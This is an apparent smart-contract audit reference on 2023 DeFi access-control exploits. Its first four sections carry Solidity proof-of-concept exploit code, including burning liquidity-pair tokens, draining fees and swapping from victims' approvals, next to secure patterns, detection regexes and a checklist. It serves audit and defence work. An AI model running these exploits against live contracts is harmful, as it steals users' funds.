---
# Core Classification
protocol: "generic"
chain: "ethereum, bsc, base"
category: "access_control"
vulnerability_type: "unprotected_mint_burn, unprotected_token_transfer, public_fee_function, swap_authorization"

# Attack Vector Details
attack_type: "logical_error"
affected_component: "token_contract, dex_pair, aggregator_router, bridge_gateway"

# Technical Primitives
primitives:
  - "public_mint"
  - "public_burn"
  - "unprotected_burnFrom"
  - "transferFeesSupportingTaxTokens"
  - "swap_from_victim"
  - "unvalidated_caller"
  - "missing_onlyOwner"
  - "missing_sender_check"
  - "delegatecall_to_arbitrary"
  - "router_authorization"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.90
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "access_control"
  - "safemoon"
  - "leetswap"
  - "swapx"
  - "dexible"
  - "socketgateway"
  - "mev_bot"
  - "unprotected_mint"
  - "unprotected_burn"
  - "fee_transfer"
  - "swap_authorization"
  - "router"
  - "aggregator"
  - "missing_modifier"
  - "real_exploit"
  - "DeFiHackLabs"
  - "2023"

# Version Info
language: "solidity"
version: ">=0.8.0"

# Source
source: DeFiHackLabs
total_exploits_analyzed: 8
total_losses: "$17M+"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [SAFEMOON-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-03/safeMoon_exp.sol` |
| [LEETSWAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-08/Leetswap_exp.sol` |
| [SWAPX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/SwapX_exp.sol` |
| [DEXIBLE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/Dexible_exp.sol` |
| [SHIDO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-06/SHIDO_exp.sol` |
| [SHIDO2-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-06/SHIDO_exp2.sol` |
| [MAESTRO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/MaestroRouter2_exp.sol` |
| [UNIBOT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/UniBot_exp.sol` |

---

# Access Control Attack Patterns (2023)

## Overview

2023 saw a proliferation of access control exploits targeting DeFi protocols at every layer — from token contracts (SafeMoon's public mint/burn: $8.9M) to DEX pair functions (LeetSwap's public fee transfer: $630K), to aggregator routers (SwapX's arbitrary-sender swap: $1M, Dexible's arbitrary transfer: $1.5M), to trading bots (MaestroRouter and UniBot router exploits). The common thread: critical functions exposed without sender verification, `onlyOwner` modifiers, or input validation. Total 2023 access control losses across the analyzed exploits exceed **$17M**.

---

## 1. Public Mint + Public Burn on Token Contract (SafeMoon $8.9M)

### Root Cause

SafeMoon's token contract had `mint()` and `burn()` functions that were callable by anyone — no `onlyOwner` or role check. An attacker could `burn()` tokens directly from the liquidity pair's balance (reducing supply in the pair), then `sync()` to update reserves, and swap the remaining tokens at a massively inflated price. Alternatively, `mint()` could create tokens out of thin air.

### Attack Scenario

1. Flash loan WBNB
2. Swap WBNB → SafeMoon via PancakeSwap
3. Call `burn(pairAddress, pairBalance - 1000000000)` — burns SafeMoon from the LP pair
4. Call `pair.sync()` — reserves update to reflect the burn (almost no SafeMoon left)
5. Swap attacker's SafeMoon → WBNB at massively inflated rate (pair has almost no SafeMoon)
6. Repay flash loan, keep profit

### Vulnerable Pattern Examples

**Example 1: SafeMoon — Public mint() and burn() ($8.9M, Mar 2023)** [CRITICAL] `@audit` [SAFEMOON-POC]

```solidity
// ❌ VULNERABLE: mint() and burn() have NO access control
// Anyone can create or destroy tokens for any address

interface ISafemoon {
    function mint(address user, uint256 amount) external;
    function burn(address from, uint256 amount) external;
    // @audit Both functions are PUBLIC — no onlyOwner check
}

function doBurnHack(uint256 amount) public {
    // Step 1: Buy a small amount of SafeMoon tokens
    swappingBnbForTokens(amount);

    // Step 2: Burn almost all SafeMoon from the liquidity pair
    sfmoon.burn(
        sfmoon.uniswapV2Pair(),
        sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000
    );
    // @audit Anyone can burn tokens from ANY address
    // @audit Pair's SafeMoon balance drops from millions to 1000

    // Step 3: Also burn tokens from the contract itself
    sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));

    // Step 4: Sync pair reserves to reflect the burn
    IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();
    // @audit Pair now has almost no SafeMoon but full WBNB reserve
    // @audit Price of SafeMoon is now astronomically high

    // Step 5: Swap attacker's SafeMoon at inflated price
    swappingTokensForBnb(sfmoon.balanceOf(address(this)));
    // @audit Small amount of SafeMoon → massive WBNB due to inflated price
}

// Flash loan callback
function pancakeCall(...) external {
    doBurnHack(amount0);
    weth.transfer(msg.sender, (amount0 * 10_030) / 10_000);
    // @audit Profit: ~$8.9M from burning pair tokens + inflated swap
}

// @audit Root cause: mint() and burn() are public functions
// @audit Fix: Add "onlyOwner" or role-based access control (RBAC)
// @audit The mint vulnerability was also exploitable independently
```

---

## 2. Public Fee Transfer Function on DEX Pair (LeetSwap $630K)

### Root Cause

LeetSwap's pair contract had a public `_transferFeesSupportingTaxTokens()` function that allowed anyone to transfer tokens out of the pair as "fees". Without access control, an attacker could drain the pair's token reserve, sync the pair to update reserves, and swap the remaining token at an inflated price.

### Vulnerable Pattern Examples

**Example 2: LeetSwap — Public _transferFeesSupportingTaxTokens() ($630K, Aug 2023)** [HIGH] `@audit` [LEETSWAP-POC]

```solidity
// ❌ VULNERABLE: _transferFeesSupportingTaxTokens is PUBLIC
// Anyone can "transfer fees" = drain tokens from the pair

function testExploit() external {
    deal(address(WETH), address(this), 0.001 ether);
    WETH.approve(address(Router), type(uint256).max);

    // Step 1: Small initial swap to get some tokens
    address[] memory path = new address[](2);
    path[0] = address(WETH);
    path[1] = address(axlUSDC);
    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        0.001 ether, 0, path, address(this), block.timestamp
    );

    // Step 2: Call the public fee function to drain pair tokens
    Pair._transferFeesSupportingTaxTokens(
        address(axlUSDC),
        axlUSDC.balanceOf(address(Pair)) - 100
    );
    // @audit Transfers almost ALL axlUSDC from pair to caller
    // @audit No access control — function should be internal

    // Step 3: Sync pair to reflect drained reserves
    Pair.sync();
    // @audit axlUSDC reserve now ~100 wei, WETH reserve unchanged

    // Step 4: Swap received tokens back at inflated rate
    axlUSDC.approve(address(Router), type(uint256).max);
    path[0] = address(axlUSDC);
    path[1] = address(WETH);
    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        axlUSDC.balanceOf(address(this)), 0, path, address(this), block.timestamp
    );
    // @audit ~$630K extracted from the pair
}
// @audit Root cause: _transferFeesSupportingTaxTokens() is external instead of internal
// @audit Function name starts with underscore but has no access restriction
// @audit Fix: Make function internal or add onlyRouter modifier
```

---

## 3. Aggregator Arbitrary-Sender Swap (SwapX $1M)

### Root Cause

SwapX aggregator's swap function accepted a `from` address parameter, allowing the caller to initiate swaps using another user's pre-approved tokens. Users who had granted token approvals to SwapX for legitimate trading had their funds drained by an attacker calling the swap function with the victim's address as the `from` parameter.

### Vulnerable Pattern Examples

**Example 3: SwapX — Swap from Arbitrary Sender ($1M, Feb 2023)** [CRITICAL] `@audit` [SWAPX-POC]

```solidity
// ❌ VULNERABLE: Swap function uses caller-specified 'from' address
// Attacker specifies victim's address as the sender of tokens

function testExploit() external {
    deal(address(DND), address(this), 1_000_000 * 1e18);

    for (uint256 i; i < victims.length; ++i) {
        uint256 transferAmount = BUSD.balanceOf(victims[i]);

        // Check victim's existing approval to SwapX
        if (BUSD.allowance(victims[i], swapX) < transferAmount) {
            transferAmount = BUSD.allowance(victims[i], swapX);
            if (transferAmount == 0) continue;
        }

        address[] memory swapPath = new address[](3);
        swapPath[0] = address(BUSD);
        swapPath[1] = address(WBNB);
        swapPath[2] = address(DND);

        // @audit Call SwapX with victim's address as the from-address
        swapX.call(abi.encodeWithSelector(
            0x4f1f05bc,
            swapPath,
            transferAmount,
            0,               // value
            array,           // swap params
            victims[i]       // @audit FROM: victim's address!
        ));
        // @audit SwapX calls BUSD.transferFrom(victim, ..., amount)
        // @audit Using victim's pre-existing approval to SwapX
        // @audit Swaps victim's BUSD → DND → sent to attacker
    }

    // Convert stolen DND to WBNB
    DNDToWBNB();
    // @audit ~$1M drained from 16 victims using their existing approvals
}
// @audit Root cause: Swap function doesn't verify msg.sender matches from
// @audit Fix: require(from == msg.sender) or eliminate the from parameter
// @audit CRITICAL: ANY user who ever approved SwapX can have ALL approved tokens stolen
```

---

## 4. Token Lock/Claim with Migration Vulnerability (SHIDO $230K)

### Root Cause

SHIDO's token migration system allowed users to lock SHIDOINU tokens and claim SHIDO tokens. The lock contract didn't properly validate the exchange rate or the amount being claimed relative to what was locked, enabling disproportionate extraction.

### Vulnerable Pattern Examples

**Example 4: SHIDO — Lock-and-Claim Token Migration Exploit ($230K, Jun 2023)** [HIGH] `@audit` [SHIDO-POC]

```solidity
// ❌ VULNERABLE: Lock contract mishandles migration rate

function DPPFlashLoanCall(...) external {
    // Step 1: Buy SHIDOINU tokens
    WBNBToSHIDOINU();

    // Step 2: Lock and immediately claim
    LockAndClaimToken();

    // Step 3: Sell claimed SHIDO tokens
    SHIDOToWBNB();
    WBNB.transfer(dodo, baseAmount);
}

function LockAndClaimToken() internal {
    SHIDOINU.approve(address(ShidoLock), type(uint256).max);
    ShidoLock.lockTokens();
    ShidoLock.claimTokens();
    // @audit Lock and claim in same transaction
    // @audit Claims disproportionate SHIDO for locked SHIDOINU
    // @audit No timelock or vesting enforced between lock and claim
}

// Additional manipulation: Front-running via fee-free router
// Attacker routes tokens through FeeFreeRouter to bypass transfer fees
FeeFreeRouter.addLiquidityETH{value: 0.01 ether}(
    address(SHIDOINU), 1e9, 1, 1, payable(address(this)), block.timestamp
);
// @audit Root cause: Instant lock → claim without delay + fee bypass route
```

---

## 5. Router/Bot Authorization Failures (Maestro $630K, UniBot $84K)

### Root Cause

Trading bot routers (MaestroRouter, UniBot) processed swap transactions on behalf of users but failed to properly verify that the calling address was authorized to execute specific operations. Attackers could call router functions directly to transfer user-approved tokens to attacker-controlled addresses.

### Vulnerable Pattern Examples

**Example 5: MaestroRouter & UniBot — Router Authorization Bypass ($714K total, Oct 2023)** [HIGH] `@audit` [MAESTRO-POC] [UNIBOT-POC]

```solidity
// ❌ VULNERABLE: Router processes swaps without verifying authorization
// Users granted approvals to router for trading → attacker exploits those approvals

// MaestroRouter2 attack pattern:
// - Users approved MaestroRouter2 to spend their tokens for automated trading
// - Attack function on router could transfer from ANY approved address
// - Attacker calls router function with victim's address → drains approved tokens
// Loss: ~$630K (~280 ETH)

// UniBot attack pattern (same root cause):
// - Users approved UniBot router for Telegram-based trading
// - Unprotected function allowed transferring from any approved address
// - Attacker drains users who had given unlimited approvals
// Loss: ~$84K

// @audit Common pattern: Trading bots storing user approvals with insufficient
// @audit function-level authorization checks
// @audit Fix: Verify msg.sender is the token owner OR has explicit delegation
// @audit Fix: Use specific per-operation signatures rather than blanket approvals
```

---

## Secure Implementations

### Pattern 1: Access-Controlled Token Operations
```solidity
// ✅ SECURE: mint/burn restricted to authorized roles
contract SafeToken is ERC20, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == from, "CAN_ONLY_BURN_OWN");
        _burn(from, amount);
    }
}
```

### Pattern 2: Sender-Verified Swaps
```solidity
// ✅ SECURE: Swap function verifies sender matches from-address
function swap(
    address[] calldata path,
    uint256 amount,
    address from
) external {
    require(from == msg.sender, "UNAUTHORIZED_SENDER");
    // @audit Only the token owner can initiate swaps from their address
    IERC20(path[0]).transferFrom(from, address(this), amount);
    // ... execute swap
}
```

### Pattern 3: Internal Fee Functions
```solidity
// ✅ SECURE: Fee transfer function is internal, not external
function _transferFees(address token, uint256 amount) internal {
    // @audit Function is internal — cannot be called externally
    IERC20(token).transfer(feeRecipient, amount);
}
```

---

## Impact Analysis

| Pattern | Frequency | Combined Losses | Severity |
|---------|-----------|----------------|----------|
| Public mint/burn on token | 2/8 reports (SafeMoon, SHIDO) | $9.1M | CRITICAL |
| Arbitrary-sender swap | 2/8 reports (SwapX, Dexible) | $2.5M | CRITICAL |
| Public pair function | 1/8 reports (LeetSwap) | $630K | HIGH |
| Router auth bypass | 2/8 reports (Maestro, UniBot) | $714K | HIGH |
| Token migration logic | 1/8 reports (SHIDO) | $230K | HIGH |

---

## Detection Patterns

### Static Analysis
```
// Detect public mint/burn without access control
pattern: function\s+(mint|burn)\s*\(.*\)\s*(external|public)
anti-pattern: onlyOwner|onlyRole|require\(msg.sender

// Detect swap with 'from' parameter that's not sender-verified
pattern: function.*swap.*address.*from.*\).*external
anti-pattern: require\(from\s*==\s*msg.sender|msg.sender.*==.*from

// Detect external functions starting with underscore
pattern: function\s+_\w+.*external
note: "Underscore prefix conventionally indicates internal/private"
```

---

## Audit Checklist

- [ ] Are `mint()` and `burn()` functions restricted to authorized callers only?
- [ ] Do aggregator/router swap functions verify `msg.sender == from`?
- [ ] Are all functions with underscore prefix actually `internal` or `private`?
- [ ] Do trading bot routers validate per-operation authorization (not just blanket approvals)?
- [ ] Can anyone call fee-related functions on DEX pair contracts?
- [ ] Do token migration/lock contracts enforce minimum lock periods?
- [ ] Is there a mechanism to revoke or limit pre-existing approvals to vulnerable routers?

---

## Real-World Examples

| Protocol | Date | Loss | Chain | Root Cause | PoC |
|----------|------|------|-------|------------|-----|
| SafeMoon | Mar 2023 | $8.9M | BSC | Public mint() and burn() — no access control | [SAFEMOON-POC] |
| Dexible | Feb 2023 | $1.5M | ETH | Arbitrary from-address in swap | [DEXIBLE-POC] |
| SwapX | Feb 2023 | $1M | BSC | Swap from caller-specified sender | [SWAPX-POC] |
| LeetSwap | Aug 2023 | $630K | BASE | Public _transferFeesSupportingTaxTokens() | [LEETSWAP-POC] |
| MaestroRouter2 | Oct 2023 | $630K | ETH | Router authorization bypass | [MAESTRO-POC] |
| SHIDO | Jun 2023 | $230K | BSC | Lock/claim migration exploit | [SHIDO-POC] |
| UniBot | Oct 2023 | $84K | ETH | Router authorization bypass | [UNIBOT-POC] |

---

## Keywords

access_control, missing_access_control, public_mint, public_burn, unprotected_mint, unprotected_burn, safemoon, onlyOwner, onlyRole, external_function, _underscore_public, fee_transfer, transferFees, leetswap, swapx, dexible, arbitrary_sender, from_address, msg_sender, router_authorization, maestro, unibot, trading_bot, approval_drain, delegatecall, swap_from_victim, SHIDO, token_migration, lock_claim, Base, BSC, 2023, DeFiHackLabs
